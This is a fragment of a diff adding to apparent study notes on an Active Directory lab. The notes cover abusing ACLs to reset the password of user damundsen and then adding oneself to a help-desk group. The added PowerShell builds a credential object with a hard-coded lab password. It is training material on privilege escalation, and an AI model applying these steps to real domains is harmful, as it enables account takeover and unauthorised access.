@@ -218,3 +218,12 @@ Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -
 
 used securestring for password of damundsen and credential object containing username and password of user wley
 
+Next, we need to perform a similar process to authenticate as the `damundsen` user and add ourselves to the `Help Desk Level 1` group.
+
+#### Creating a SecureString Object using damundsen
+
+```powershell
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+```
+
